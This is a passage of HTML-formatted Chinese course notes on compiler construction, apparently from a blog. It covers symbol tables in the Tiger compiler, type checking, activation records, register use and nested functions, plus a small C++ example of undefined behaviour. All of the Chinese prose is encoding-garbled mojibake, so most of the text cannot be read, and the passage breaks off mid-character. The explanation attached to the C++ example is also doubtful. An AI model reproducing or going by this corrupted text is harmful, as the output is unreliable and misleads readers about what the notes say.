é™¤ã€å¤åŸç­‰æ“ä½œï¼Œè¿›ä¸€æ­¥é™ä½å•æ¬¡æ“ä½œçš„ç©ºé—´å¤æ‚åº¦ï¼Œéå¸¸æ–¹ä¾¿</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p>ä¸¤ç§æ–¹æ³•å‡å¯ä½¿ç”¨ã€‚</p>\n<h3 id=\"Tigerç¼–è¯‘å™¨ç¬¦å·ç›¸å…³çš„å®ç°\"><a href=\"#Tigerç¼–è¯‘å™¨ç¬¦å·ç›¸å…³çš„å®ç°\" class=\"headerlink\" title=\"Tigerç¼–è¯‘å™¨ç¬¦å·ç›¸å…³çš„å®ç°\"></a>Tigerç¼–è¯‘å™¨ç¬¦å·ç›¸å…³çš„å®ç°</h3><p>åœ¨å“ˆå¸Œè¡¨ä¸­çš„é“¾è¡¨è¿›è¡Œlookupæ—¶ï¼Œä¸æ–­è¿›è¡Œå­—ç¬¦ä¸²æ¯”è¾ƒæ˜¯å¾ˆè€—æ—¶çš„ã€‚</p>\n<ul>\n<li>è§£å†³åŠæ³•ï¼šä½¿ç”¨æ–°çš„æ•°æ®ç»“æ„å°†ç¬¦å·å¯¹è±¡å…³è”åˆ°ä¸€ä¸ªæ•´æ•°ä¸Šï¼ˆå“ˆå¸Œå€¼ï¼‰</li>\n</ul>\n<p>Tigerç¼–è¯‘å™¨çš„environmentæ˜¯destructive-updateçš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æœ‰ä¸¤ä¸ªå‡½æ•°ï¼š</p>\n<ul>\n<li><code>S_beginScope</code>: è®°ä¸‹å½“å‰ç¬¦å·è¡¨çš„çŠ¶æ€</li>\n<li><code>S_endScope</code>: æ¢å¤åˆ°æœ€è¿‘çš„ã€è¿˜æœªè¢«æ¢å¤çš„<code>S_beginScope</code>è®°ä¸‹çš„çŠ¶æ€</li>\n</ul>\n<p>æˆ‘ä»¬å¼•å…¥ä¸€ä¸ª**è¾…åŠ©æ ˆ(Auxiliary stack)**æ¥ç»´æŠ¤ä¸Šæ–‡æåˆ°çš„å¿…è¦çš„é¢å¤–ä¿¡æ¯:</p>\n<ul>\n<li>ç¬¦å·å…¥æ ˆæ—¶ï¼Œä¼šå°†bindingè”åŠ¨åœ°æ’å…¥å¯¹åº”bucketçš„é“¾è¡¨å¤´</li>\n<li>å¼¹å‡ºæ ˆé¡¶ç¬¦å·æ—¶ï¼Œå¯¹åº”bucketçš„é“¾è¡¨å¤´ä¹Ÿä¼šè”åŠ¨åœ°è¢«ç§»é™¤</li>\n<li>beginScope: å‹å…¥ä¸€ä¸ªç‰¹æ®Šæ ‡è®°åˆ°è¾…åŠ©æ ˆä¸­</li>\n<li>endScope: ä¸€ç›´å¼¹å‡ºç¬¦å·ç›´åˆ°å¼¹å‡ºäº†ä¸€ä¸ªç‰¹æ®Šæ ‡è®°<ul>\n<li>æˆ‘ä»¬å¯ä»¥ç”±æ­¤æ ‡è®°æ¨æ–­ï¼šæ­¤æ¬¡å› ä¸ºé€€å‡ºscopeå¼•å‘çš„restoreæ“ä½œå¯ä»¥å°±æ­¤ç»“æŸ</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"ç±»å‹æ£€æŸ¥\"><a href=\"#ç±»å‹æ£€æŸ¥\" class=\"headerlink\" title=\"ç±»å‹æ£€æŸ¥\"></a>ç±»å‹æ£€æŸ¥</h3><ol>\n<li><p>ç±»å‹ç³»ç»Ÿ</p>\n<p> ç±»å‹é™å®šäº†å˜é‡çš„å–å€¼èŒƒå›´ä»¥åŠéƒ¨åˆ†è¿ç®—è§„åˆ™ã€‚<br> å¯ä»¥å¤§è‡´æŠŠç¼–ç¨‹è¯­è¨€åˆ†ä¸ºï¼š</p>\n<ul>\n<li>ç±»å‹åŒ–çš„(typed): C&#x2F;C++ Java Go</li>\n<li>éç±»å‹åŒ–çš„(untyped): LISP JavaScript<ul>\n<li>æ³¨æ„ï¼šä¸æ˜¯æ²¡æœ‰ç±»å‹ï¼Œè€Œæ˜¯ç±»å‹å¯å˜</li>\n</ul>\n</li>\n</ul>\n<p> ç±»å‹ç³»ç»Ÿä½œç”¨ï¼š</p>\n<ul>\n<li>æé«˜å¼€å‘æ•ˆç‡ï¼ˆé«˜å±‚æŠ½è±¡&amp;æŒ‡ç§°è¯­ä¹‰ï¼‰</li>\n<li>æé«˜è¿è¡Œæ€§èƒ½ï¼ˆæŒ‡å¯¼ç¼–è¯‘ä¼˜åŒ–ï¼‰</li>\n<li>æé«˜å®‰å…¨æ€§ï¼ˆå†…å­˜å®‰å…¨ç­‰ï¼‰</li>\n<li>â€¦</li>\n</ul>\n<blockquote>\n<p>äº‹å®ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºæ¯å¼•å…¥ä¸€ç§ç±»å‹å°±èƒ½<strong>å®Œå…¨</strong>æ¶ˆé™¤æŸä¸€ç±»ç‰¹å®šé”™è¯¯ã€‚</p>\n</blockquote>\n<p> å½¢å¼åŒ–çš„ç±»å‹ç³»ç»Ÿå¯ç”¨äºæ•°å­¦é¢†åŸŸï¼Œå‚è§Coqä»¥åŠ<a href=\"https://leanprover-community.github.io/\">LEAN</a></p>\n</li>\n<li><p>Tigerçš„ç±»å‹ç³»ç»Ÿ<br> åŒ…å«ï¼š</p>\n<ul>\n<li>åŸå§‹ç±»å‹(primitive type): <code>int</code>å’Œ<code>string</code></li>\n<li>æ„é€ ç±»å‹(constructed type): <code>record</code>ï¼ˆç±»ä¼¼ç»“æ„ä½“ï¼‰ å’Œ<code>array</code></li>\n</ul>\n<p> æ ¹æ®ä¸åŒçš„åˆ¤åˆ«æ³•ï¼Œ<strong>ç±»å‹ç­‰ä»·</strong>è¿™ä¸€å…³ç³»åˆ†ä¸ºï¼š</p>\n<ul>\n<li>Name equivalence (NE): å¿…é¡»å£°æ˜æ˜¯åŒä¸€ä¸ªç±»å‹æ‰æ˜¯åŒä¸€ç±»å‹</li>\n<li>Structure equivalence (SE): â€œé•¿å¾—ä¸€æ ·â€ï¼ˆå†…éƒ¨ç»“æ„ä¸€æ ·ï¼‰å°±æ˜¯åŒä¸€ç±»å‹</li>\n</ul>\n<p> æ˜¾ç„¶å‰è€…è¢«å¹¿æ³›é‡‡ç”¨ï¼ŒTigerè¯­è¨€ä¹Ÿä¸ä¾‹å¤–ã€‚<br> Tigerå­˜åœ¨ä¸¤ä¸ªç‹¬ç«‹çš„å‘½åç©ºé—´ï¼Œä¸åŒå‘½åç©ºé—´çš„åŒåidentifierä¸ä¼šäº’ç›¸é®è”½(hide)å¯¹æ–¹ï¼š</p>\n<ul>\n<li>Types</li>\n<li>Functions and variables</li>\n</ul>\n</li>\n<li><p>Tigerçš„ç±»å‹æ£€æŸ¥</p>\n<p>Tigerçš„è¯­ä¹‰åˆ†æéœ€è¦ä¸¤ä¸ªç¯å¢ƒï¼š</p>\n<ul>\n<li><p><code>Type</code>: æŠŠç±»å‹ç¬¦å·æ˜ å°„åˆ°å…¶è¡¨ç¤ºçš„å…·ä½“ç±»å‹å¯¹åº”çš„æ•°æ®ç»“æ„</p>\n<ul>\n<li>åˆå§‹æ—¶åŒ…å«primitive typeå¯¹åº”çš„æ˜ å°„ int $\\mapsto$ Ty_int, string $\\mapsto$ Ty_string</li>\n</ul>\n</li>\n<li><p><code>Value</code>: æŠŠå˜é‡åæ˜ å°„åˆ°å…·ä½“ç±»å‹ï¼ŒæŠŠå‡½æ•°åæ˜ å°„åˆ°(å‚æ•°ç±»å‹, è¿”å›å€¼ç±»å‹)ï¼ˆä¹Ÿå°±æ˜¯å‡½æ•°ç­¾åï¼‰</p>\n<ul>\n<li>åˆå§‹æ—¶åŒ…å«Tigerä¸­é¢„å®šä¹‰çš„ä¸€äº›å‡½æ•°å®šä¹‰</li>\n</ul>\n</li>\n</ul>\n<p><code>semant</code> æ¨¡å—åŒ…å«ç±»å‹æ£€æŸ¥ç­‰è¯­ä¹‰åˆ†æç›¸å…³æ“ä½œã€‚ç±»å‹æ£€æŸ¥åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š</p>\n<ul>\n<li>Type-checking expressions<ul>\n<li><code>transExp</code>å¯ä»¥åœ¨ç»™å®šçš„ä¸¤ä¸ªç¯å¢ƒä¸‹å°†è¾“å…¥çš„è¡¨è¾¾å¼æ ‡è®°ä¸Štypeï¼ˆå¦‚æœå‘ç°éæ³•åˆ™æŠ¥é”™ï¼‰</li>\n</ul>\n</li>\n<li>Type-checking declarations<ul>\n<li>åœ¨Tigerè¯­è¨€ä¸­å£°æ˜åªå¯èƒ½åœ¨<code>let</code>è¯­å¥ä¸­å‡ºç°</li>\n<li>å˜é‡å£°æ˜ï¼šå¦‚æœæä¾›äº†å˜é‡ç±»å‹ï¼Œåˆ™æ£€æŸ¥åˆå§‹åŒ–è¡¨è¾¾å¼ç±»å‹æ˜¯å¦åŒ¹é…ï¼›å¦åˆ™ç›´æ¥é€šè¿‡åˆå§‹åŒ–è¡¨è¾¾å¼ç±»å‹è·å¾—å˜é‡ç±»å‹</li>\n<li>ç±»å‹å£°æ˜ï¼š<strong>é€’å½’åœ°</strong>è·å–ç±»å‹åˆ«åå¯¹åº”çš„å®é™…ç±»å‹ã€‚<ul>\n<li>Q: å¦‚ä½•å¤„ç†é€’å½’å£°æ˜ <code>type list = &#123;first: int, rest: list&#125;</code>ï¼ŸA: ä¸ä½¿ç”¨one-passè€Œæ˜¯two-pass: pass#1: è®°å½•å£°æ˜å¤´éƒ¨ï¼ˆå·¦ä¾§ï¼‰æ”¾å…¥ç¯å¢ƒï¼›pass#2: å®Œæˆ</li>\n<li>ä¸å…è®¸ç±»å‹çš„ç›´æ¥å¾ªç¯å¼•ç”¨(<code>type a=b;type b=a</code>)ï¼šå¿…é¡»é€šè¿‡recordæˆ–arrayå®Œæˆ(<code>type a=b;type b=&#123;i:a&#125;</code>)</li>\n</ul>\n</li>\n<li>å‡½æ•°å£°æ˜ï¼šæ£€æŸ¥å½¢å‚ã€è¿”å›å€¼ä¸å‡½æ•°ä½“<ul>\n<li>Q: å¦‚ä½•å¤„ç†é€’å½’å£°æ˜ï¼ŸA: ä¸ä½¿ç”¨one-passè€Œæ˜¯two-pass: pass#1: è®°å½•å‡½æ•°å£°æ˜ï¼ˆç­¾åï¼‰æ”¾å…¥ç¯å¢ƒï¼›pass#2: å¤„ç†å‡½æ•°é¢˜</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<hr>\n<blockquote>\n<p><strong>!!!ä»¥ä¸Šæ‰€æœ‰å†…å®¹ä¸ºæœŸä¸­è€ƒè¦†ç›–èŒƒå›´</strong></p>\n</blockquote>\n<hr>\n<h2 id=\"Part-9-æ´»åŠ¨è®°å½•Activation-Record\"><a href=\"#Part-9-æ´»åŠ¨è®°å½•Activation-Record\" class=\"headerlink\" title=\"Part 9: æ´»åŠ¨è®°å½•Activation Record\"></a>Part 9: æ´»åŠ¨è®°å½•Activation Record</h2><blockquote>\n<p>å…¶å®Activation Recordå°±æ˜¯æ ˆå¸§Stack Frame</p>\n</blockquote>\n<h3 id=\"Why-How\"><a href=\"#Why-How\" class=\"headerlink\" title=\"Why &amp; How\"></a>Why &amp; How</h3><p>ç¼–è¯‘è¿‡ç¨‹éœ€è¦åŒºåˆ†ä»£ç ï¼ˆç”±PCå¯„å­˜å™¨æŒ‡å‘ï¼‰ä¸æ•°æ®ã€‚</p>\n<ul>\n<li>é«˜åœ°å€å‘ä½åœ°å€å¢é•¿ï¼šæ ˆStack</li>\n<li>ä½åœ°å€å‘é«˜åœ°å€å¢é•¿ï¼šå †Heap</li>\n<li>ä½åœ°å€ï¼šé™æ€æ•°æ®ï¼ˆä»£ç +å…¨å±€å˜é‡ï¼‰</li>\n</ul>\n<p>é€’å½’&#x2F;è°ƒç”¨å­å‡½æ•°æ—¶éœ€è¦åœ¨<strong>æ ˆå¸§</strong>å­˜æ”¾å½“å‰å‡½æ•°çš„ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼š</p>\n<ul>\n<li>è°ƒç”¨çš„å‚æ•°</li>\n<li>å±€éƒ¨å˜é‡</li>\n<li>å­å‡½æ•°æ‰§è¡Œå®Œæ¯•åçš„è¿”å›åœ°å€</li>\n<li>â€¦</li>\n</ul>\n<p>ä¸»è¦å¯„å­˜å™¨ï¼š</p>\n<ol>\n<li>Frame Pointer&#x2F;Base Pointer åŸºå€å¯„å­˜å™¨</li>\n<li>Stack Pointer æ ˆé¡¶å¯„å­˜å™¨<br>ä¾‹å¦‚f()ä¸­è°ƒç”¨g():<br><img src=\"/compiler-construction-principles/ar-entering.png\" alt=\"ar-entering\" loading=\"lazy\"><br>ç„¶åg()æ‰§è¡Œå®Œæ¯•è¿”å›f()ç»§ç»­æ‰§è¡Œï¼š<br><img src=\"/compiler-construction-principles/ar-exiting.png\" alt=\"ar-exiting\" loading=\"lazy\"></li>\n</ol>\n<blockquote>\n<p>æ‰€ä»¥å­å‡½æ•°æ˜¯é€šè¿‡åŸºå€å¯„å­˜å™¨å‘é«˜åœ°å€ï¼Œè¶Šè¿‡è¿”å›åœ°å€è·å–è‡ªå·±çš„å‚æ•°ã€‚</p>\n</blockquote>\n<p>æ€è€ƒï¼šä¸ºä»€ä¹ˆä¸å¼€å¯ä¼˜åŒ–çš„æ—¶å€™å¦‚ä¸‹çš„å†™æ³•å¯ä»¥â€œè¿”å›â€å€¼ï¼Ÿ</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;bits/stdc++.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">foo</span><span class=\"params\">(<span class=\"type\">int</span> num)</span> </span>&#123;</span><br><span class=\"line\"> <span class=\"type\">int</span> var=num+<span class=\"number\">1</span>;</span><br><span class=\"line\"> <span class=\"comment\">// no return!</span></span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\"> <span class=\"type\">int</span> a = <span class=\"built_in\">foo</span>(<span class=\"number\">114514</span>);</span><br><span class=\"line\"> cout&lt;&lt; a &lt;&lt;endl; <span class=\"comment\">// 114515</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>ç­”æ¡ˆï¼šå¦‚æœæœ‰returnè¯­å¥ï¼Œè¿”å›å€¼ä¼šè¢«pushåˆ°æ ˆå¸§ã€‚ä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰returnè¯­å¥ï¼Œæ‰€ä»¥æœ¬æ¥æ˜¯è¿”å›å€¼çš„ä½ç½®å°±è¢«<code>var</code>ç»™â€œå†’å……â€äº†ã€‚å½“ç„¶è¿™æ˜¯UB, ä¸èƒ½ä¿è¯è¿™ç§è¡Œä¸ºçš„å¯é‡å¤æ€§ï¼ˆä¾‹å¦‚å¼€å¯é«˜ä¼˜åŒ–çº§åˆ«&#x2F;è¿”å›å¸¸æ•°è¢«ç¼–è¯‘å™¨å†…è”ï¼‰ã€‚</p>\n<h3 id=\"æ€»ç»“\"><a href=\"#æ€»ç»“\" class=\"headerlink\" title=\"æ€»ç»“\"></a>æ€»ç»“</h3><p>åŸºå€å¯„å­˜å™¨&#x3D;FP<br>æ ˆé¡¶å¯„å­˜å™¨&#x3D;SP<br>å¦‚æœfè°ƒç”¨g(a1, a2, â€¦):</p>\n<ul>\n<li>SPæŒ‡å‘ç¬¬ä¸€ä¸ªå‚æ•°a1</li>\n<li>SPå‡å»æ ˆå¸§å¤§å°ï¼ˆå‘ä½åœ°å€å¢é•¿ï¼‰å¾—åˆ°FP<br>è¿›å…¥g:</li>\n<li>å°†æ—§çš„FPå‹å…¥æ ˆ</li>\n<li>ä»¤æ–°çš„FP&#x3D;SP</li>\n<li>gå¯ä»¥åŸºäºFPå‘é«˜åœ°å€è·å–å‚æ•°ï¼Œæˆ–å‘ä½åœ°å€å‹å…¥&#x2F;æŸ¥è¯¢å±€éƒ¨å˜é‡<br>ä»gé€€å‡ºï¼š</li>\n<li>è¿”å›å€¼æ‹·è´è‡³ç‰¹æ®Šå¯„å­˜å™¨</li>\n<li>SP&#x3D;FPï¼ˆé‡Šæ”¾gçš„æ ˆå¸§ï¼‰</li>\n<li>ä»æ ˆä¸Šå–å›æ—§çš„FPå€¼åˆ°FPä¸­</li>\n</ul>\n<h2 id=\"Part-10-å¯„å­˜å™¨ä¸å˜é‡\"><a href=\"#Part-10-å¯„å­˜å™¨ä¸å˜é‡\" class=\"headerlink\" title=\"Part 10: å¯„å­˜å™¨ä¸å˜é‡\"></a>Part 10: å¯„å­˜å™¨ä¸å˜é‡</h2><p>Intuition: å†…å­˜å¤ªæ…¢äº†ï¼Œä½¿ç”¨å±‚æ¬¡åŒ–çš„å‚¨å­˜æé«˜é€Ÿåº¦(Regs-L1-L2-L3-Mem-Disksâ€¦)<br>æ‰€ä»¥å…¶å®å¹¶ä¸æ˜¯æ‰€æœ‰å‚æ•°&#x2F;å±€éƒ¨å˜é‡éƒ½è¦æ”¾æ ˆä¸Šï¼Œæœ‰æ—¶ç›´æ¥é€šè¿‡å¯„å­˜å™¨ä¼ å‚&#x2F;ä¿å­˜å±€éƒ¨å˜é‡å³å¯ã€‚<br>Tigerè¯­è¨€ï¼šé»˜è®¤æŒ‰å€¼ä¼ é€’ï¼Œå‡½æ•°å†…éƒ¨æ”¹å˜ä¸å½±å“å¤–éƒ¨å€¼<br><em>æ³¨ï¼šå‡½æ•°&#x2F;è¿‡ç¨‹è¿™ä¸¤ä¸ªè¯å¯ä»¥æ··ç”¨ï¼Œæ˜¯ä¸€ä¸ªå«ä¹‰ã€‚</em></p>\n<h3 id=\"å±€éƒ¨å˜é‡\"><a href=\"#å±€éƒ¨å˜é‡\" class=\"headerlink\" title=\"å±€éƒ¨å˜é‡\"></a>å±€éƒ¨å˜é‡</h3><p>è°ƒç”¨å‡½æ•°éœ€è¦ä¿æŠ¤ç°åœºï¼šå› ä¸ºå¯„å­˜å™¨çš„å€¼å¯èƒ½ä¼šè¢«å­å‡½æ•°æ”¹å˜ï¼Œè¿”å›æ—¶â€œç°åœºå·²ç»è¢«ç ´åâ€ã€‚ä¸ºæ­¤éƒ¨åˆ†å¯„å­˜å™¨çš„å€¼éœ€è¦åœ¨æ ˆä¸Šè¿›è¡Œå¤‡ä»½ã€‚åˆ†ä¸ºä»¥ä¸‹ä¸¤ç§ï¼š</p>\n<ul>\n<li>Caller-save: ä¾‹å¦‚ä¸´æ—¶å¯„å­˜å™¨ï¼Œè°ƒç”¨è€…å¦‚æœç”¨åˆ°åˆ™éœ€è¦è‡ªå·±ä¿å­˜ï¼Œå­å‡½æ•°å¯ä»¥ä»»æ„ä¿®æ”¹</li>\n<li>Callee-save: ä¾‹å¦‚FP&#x2F;SP, ç”±å­å‡½æ•°è´Ÿè´£ä¿å­˜ä¸æ¢å¤ï¼ˆè¿›å…¥å­å‡½æ•°æ—¶pushåˆ°æ ˆï¼Œé€€å‡ºæ—¶ä»æ ˆé‡Œpopï¼‰ï¼Œè°ƒç”¨è€…æ— éœ€å…³å¿ƒ</li>\n</ul>\n<h3 id=\"å‚æ•°ä¼ é€’\"><a href=\"#å‚æ•°ä¼ é€’\" class=\"headerlink\" title=\"å‚æ•°ä¼ é€’\"></a>å‚æ•°ä¼ é€’</h3><p>å‡½æ•°è°ƒç”¨ä¼ å‚ï¼šå¤§éƒ¨åˆ†ç°ä»£ç¼–è¯‘å™¨å¯¹äºå‰å‡ ä¸ªå‚æ•°ç›´æ¥é€šè¿‡å¯„å­˜å™¨ä¼ é€’ï¼Œå¤šä½™çš„åˆ™ä»ç„¶é€šè¿‡æ ˆå®Œæˆä¼ é€’ã€‚<br>ä½†æ˜¯ç‰©ç†å¯„å­˜å™¨çš„æ•°é‡æ˜¯æœ‰é™çš„ï¼šå‡è®¾æœ‰å¦‚ä¸‹è°ƒç”¨é“¾f(x)-&gt;g(y)-&gt;h(z), å¦‚æœæ‰€æœ‰å‡½æ•°éƒ½é€šè¿‡å¯„å­˜å™¨<code>r1</code>æ¥æ”¶å‚æ•°ï¼Œåˆ™fè°ƒç”¨g(y)æ—¶è¦å¤‡ä»½<code>r1</code>ï¼Œå†å°†<code>r1</code>è®¾ä¸ºè¦ä¼ ç»™gçš„å‚æ•°y.<br>å› æ­¤ï¼Œæ¯ä¸ªå‡½æ•°éƒ½è¦å°†<code>r1</code>åœ¨æ ˆä¸Šå¤‡ä»½ï¼Œå¸¦æ¥é¢å¤–çš„å†…å­˜trafficã€‚<br>ä¼˜åŒ–ç­–ç•¥ï¼š</p>\n<ul>\n<li>ä»å˜é‡ç”Ÿå‘½å‘¨æœŸå…¥æ‰‹ï¼šå¦‚æœå¯„å­˜å™¨å¯¹åº”çš„å˜é‡&#x2F;å‚æ•°åœ¨å½“å‰å‡½æ•°ä¸å†ä½¿ç”¨ï¼Œå­å‡½æ•°è¦†ç›–äº†è‡ªç„¶ä¹Ÿæ— å¦¨</li>\n<li>å…¨å±€å¯„å­˜å™¨åˆ†é…ç­–ç•¥ï¼šæ¯ä¸ªå‡½æ•°ä½¿ç”¨ä¸åŒçš„ä¸€ç»„å¯„å­˜å™¨ä¼ å‚</li>\n<li>ä¼˜åŒ–å¶è¿‡ç¨‹(Leaf Procedure)ï¼šå¦‚æœæŸå‡½æ•°ä¸è°ƒç”¨ä»»ä½•å…¶ä»–è¿‡ç¨‹ï¼Œè‡ªç„¶ä¹Ÿä¸éœ€è¦ä¸ºï¼ˆä¸å­˜åœ¨çš„ï¼‰å­è¿‡ç¨‹å¤‡ä»½ä¼ å…¥çš„å‚æ•°</li>\n<li>å¯„å­˜å™¨çª—å£Register Windows: æ¯æ¬¡è°ƒç”¨å‡½æ•°æ—¶ï¼Œå°½å¯èƒ½åˆ©ç”¨å°šæœªç”¨åˆ°çš„å¯„å­˜å™¨ï¼Œç„¶åä¸ºå­å‡½æ•°åˆ†é…æ–°çš„ä¸€å¥—å¯ç”¨çš„å¯„å­˜å™¨ï¼ˆSPARCé‡‡ç”¨è¯¥ç­–ç•¥ï¼‰</li>\n</ul>\n<h3 id=\"è¿”å›å€¼ä¸è¿”å›åœ°å€\"><a href=\"#è¿”å›å€¼ä¸è¿”å›åœ°å€\" class=\"headerlink\" title=\"è¿”å›å€¼ä¸è¿”å›åœ°å€\"></a>è¿”å›å€¼ä¸è¿”å›åœ°å€</h3><ul>\n<li><p>è¿”å›åœ°å€:<br>Tl;DR: å‡½æ•°è°ƒç”¨<code>call</code>æŒ‡ä»¤åœ°å€ä¸ºaï¼Œåˆ™å‡½æ•°è°ƒç”¨å®Œæ¯•åº”è¿”å›è‡³åœ°å€a+1<br>ç°ä»£æœºå™¨åŸºæœ¬å°†è¯¥åœ°å€ä¿å­˜åœ¨ä¸€ä¸ªæŒ‡å®š(designated)å¯„å­˜å™¨ä¸­ã€‚éå¶è¿‡ç¨‹éœ€è¦åœ¨è°ƒç”¨æ—¶æŠŠè¯¥å€¼å†™å…¥æ ˆä¸Šï¼Œå¶è¿‡ç¨‹åˆ™ä¸å¿…ã€‚</p>\n</li>\n<li><p>è¿”å›å€¼ï¼š</p>\n<ul>\n<li>å¦‚æœå¯ä»¥åˆ™æ”¾ç½®åœ¨æŒ‡å®šå¯„å­˜å™¨ä¸­ï¼ˆä¾‹å¦‚X86-64ä½¿ç”¨<code>rax</code>ï¼‰ã€‚</li>\n<li>å¦‚æœä¸å¯ä»¥ï¼ˆå¦‚ï¼šè¿”å›å¯¹è±¡å¤ªå¤§ï¼‰ï¼Œä¸€èˆ¬æ¥è¯´è°ƒç”¨è€…ä¼šåœ¨è‡ªå·±æ ˆå¸§å¼€ä¸€ä¸ªä¸´æ—¶ç©ºé—´ï¼Œç„¶åå°†åœ°å€ä½œä¸ºä¸€ä¸ªéšè—çš„å‚æ•°ä¼ é€’ç»™è¢«è°ƒç”¨å‡½æ•°ã€‚è¿™æ ·è¢«è°ƒç”¨æ–¹å¯ä»¥ç›´æ¥åœ¨è¿™ä¸ªç©ºé—´ä¸Šå‚¨å­˜è¿”å›å€¼ï¼Œæœ€åç”¨å¯„å­˜å™¨ï¼ˆæ¯”å¦‚<code>eax</code>&#x2F;<code>rax</code>ï¼‰æŠŠè¿”å›å€¼æ‰€åœ¨åœ°å€å‘Šè¯‰è°ƒç”¨è€…ã€‚</li>\n</ul>\n</li>\n</ul>\n<hr>\n<p>å…³äºå±€éƒ¨å˜é‡ã€è¡¨è¾¾å¼ä¸­é—´å€¼å¦‚ä½•å°½å¯èƒ½åœ°åˆ©ç”¨å¯„å­˜å™¨å‚¨å­˜ï¼Œå°½é‡å‡å°‘å†…å­˜trafficï¼Œä»¥åä¼šåœ¨<em>å¯„å­˜å™¨åˆ†é…</em>éƒ¨åˆ†è¯¦ç»†é˜è¿°ã€‚</p>\n<h3 id=\"Frame-Resident-Variables\"><a href=\"#Frame-Resident-Variables\" class=\"headerlink\" title=\"Frame-Resident Variables\"></a>Frame-Resident Variables</h3><p>å¯„å­˜å™¨å¹¶éä¸‡èƒ½ï¼šæœ‰æ—¶ï¼Œåœ¨æ ˆä¸Šåˆ†é…ç©ºé—´ï¼ˆå®ä½“åŒ–ï¼‰æ˜¯ä¸å¯é¿å…çš„ã€‚ä¾‹å¦‚ï¼š</p>\n<ul>\n<li>å¯¹è±¡è¿‡å¤§ï¼Œæ— æ³•æ”¾åœ¨å¯„å­˜å™¨ä¸­</li>\n<li>æ•°ç»„å¯¹è±¡ï¼Œéœ€è¦é€šè¿‡åœ°å€åç§»è®¿é—®</li>\n<li>å¯„å­˜å™¨è¢«ç‰¹æ®Šéœ€è¦ï¼Œä¾‹å¦‚ä¸Šæ–‡æåˆ°å¯èƒ½ç”¨äºä¼ å‚</li>\n<li>å¤ªå¤šä¸­é—´å€¼&#x2F;å±€éƒ¨å˜é‡ï¼Œæœ‰é™çš„å¯„å­˜å™¨æ”¾ä¸ä¸‹<ul>\n<li>ç§°ä¸º <strong>â€œSpillâ€</strong> äº†, åœ¨å¯„å­˜å™¨åˆ†é…éƒ¨åˆ†ä¼šå±•å¼€è®¨è®º<br>ä»¥åŠæœ‰æ—¶å˜é‡â€œé€ƒé€¸(escape)â€äº†ï¼ˆä¹Ÿå°±æ˜¯è„±ç¦»äº†å½“å‰scope&#x2F;æ— æ³•ç¡®å®šå˜é‡æœ‰æ•ˆçš„ç”Ÿå‘½å‘¨æœŸï¼‰ï¼š</li>\n</ul>\n</li>\n<li>å¼•ç”¨ä¼ å‚ï¼šéœ€è¦å†…å­˜åœ°å€ï¼ˆè™½ç„¶å¯¹äºç°ä»£è¯­è¨€ç»è¿‡ä¼˜åŒ–å¹¶ä¸æ€»æ˜¯éœ€è¦ä¸€ä¸ªåœ°å€ï¼‰</li>\n<li>æ˜¾å¼åœ°å–å˜é‡åœ°å€ï¼ˆCè¯­è¨€ç­‰ï¼‰</li>\n<li>è¢«åµŒå¥—å‡½æ•°è®¿é—®ï¼ˆTigerè¯­è¨€ä¸éœ€è¦è€ƒè™‘ï¼‰</li>\n</ul>\n<p>è¿™äº›å˜é‡å°±æ˜¯ <em>frame-resident</em> çš„ï¼Œä¹Ÿå°±æ˜¯å®ƒä»¬ä¸å¾—ä¸è¢«åˆ†é…åœ¨æ ˆå¸§ä¸Šã€‚</p>\n<h2 id=\"Part-11-å—ç»“æ„Block-Structure\"><a href=\"#Part-11-å—ç»“æ„Block-Structure\" class=\"headerlink\" title=\"Part 11: å—ç»“æ„Block Structure\"></a>Part 11: å—ç»“æ„Block Structure</h2><p>Intuition: åœ¨å…è®¸å‡½æ•°åµŒå¥—å®šä¹‰çš„è¯­è¨€ï¼ˆæ¯”å¦‚Tigerï¼‰ä¸­ï¼Œå†…éƒ¨å‡½æ•°å¯èƒ½ä½¿ç”¨å¤–éƒ¨å‡½æ•°ä¸­çš„å±€éƒ¨å˜é‡ã€‚<br><img src=\"/compiler-construction-principles/nested-funcs.png\" loading=\"lazy\"><br>æˆ‘ä»¬å¯ä»¥é€šè¿‡FPè®¿é—®ï¼ˆå› ä¸ºå®šä¹‰çš„å˜é‡å†…å­˜åœ°å€åœ¨ç¼–è¯‘æ—¶æœªçŸ¥ï¼Œ<strong>ä½†ç›¸å¯¹å½“å‰å‡½æ•°çš„FPåç§»å€¼(offset)æ˜¯å·²çŸ¥çš„</strong>ï¼‰ã€‚</p>\n<p>åœ¨ç¼–è¯‘æ—¶ï¼Œå¦‚ä½•ä½¿å¾—å†…éƒ¨å‡½æ•°è®¿é—®éå±€éƒ¨å®šä¹‰çš„å¤–éƒ¨å˜é‡å‘¢ï¼Ÿæœ‰ä»¥ä¸‹å‡ ç§æ–¹æ³•ï¼š</p>\n<ul>\n<li><strong>é™æ€é“¾æ¥Static Link</strong>: å½“å†…éƒ¨å‡½æ•°<code>g</code>è¢«è°ƒç”¨æ—¶ï¼Œè°ƒç”¨è€…<code>f</code>ä¼ å…¥ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘<code>f</code>çš„æ 